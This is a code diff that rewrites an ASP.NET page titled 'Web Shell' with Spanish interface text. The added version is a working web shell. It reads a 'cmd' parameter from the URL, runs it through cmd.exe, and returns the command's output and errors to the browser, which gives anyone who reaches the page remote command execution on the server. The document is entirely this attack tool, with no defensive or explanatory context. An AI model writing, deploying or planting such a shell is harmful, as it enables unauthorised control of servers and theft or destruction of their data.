@@ -1,44 +1,39 @@
-<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="webshell.aspx.cs" Inherits="WebShell.webshell" %>
-
+<%@ Page Language="C#" %>
 <!DOCTYPE html>
-
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head runat="server">
-    <title></title>
+<html>
+<head>
+    <title>Web Shell</title>
 </head>
 <body>
-    <form id="form1" runat="server">
-        <div>
-            <input type="text" name="cmd" id="cmd" placeholder="Comando a ejecutar..." />
-            <br />
-            <asp:Literal ID="litOutput" runat="server"></asp:Literal>
-        </div>
+    <form method="get">
+        <input type="text" name="cmd" style="width:400px" placeholder="Comando a ejecutar..." />
+        <input type="submit" value="Ejecutar" />
     </form>
-</body>
-</html>
-
-<script runat="server">
-    protected void Page_Load(object sender, EventArgs e)
+    <pre>
+<%
+    string cmd = Request.QueryString["cmd"];
+    if (!string.IsNullOrEmpty(cmd))
     {
-        if (Request.QueryString["cmd"] != null && !string.IsNullOrEmpty(Request.QueryString["cmd"]))
+        try
         {
-            string command = Request.QueryString["cmd"];
-            try
-            {
-                System.Diagnostics.Process process = new System.Diagnostics.Process();
-                process.StartInfo.FileName = "cmd.exe";
-                process.StartInfo.Arguments = "/c " + command;
-                process.Start();
-
-                while (!process.StandardOutput.EndOfStream)
-                {
-                    litOutput.Text += process.StandardOutput.ReadLine() + "<br />";
-                }
-            }
-            catch (Exception ex)
-            {
-                litOutput.Text = "Error ejecutando comando: " + ex.Message;
-            }
+            System.Diagnostics.Process p = new System.Diagnostics.Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.Arguments = "/c " + cmd;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardError = true;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.CreateNoWindow = true;
+            p.Start();
+            Response.Write(p.StandardOutput.ReadToEnd());
+            Response.Write(p.StandardError.ReadToEnd());
+            p.WaitForExit();
+        }
+        catch (System.Exception ex)
+        {
+            Response.Write("Error: " + ex.Message);
         }
     }
-</script>
+%>
+    </pre>
+</body>
+</html>
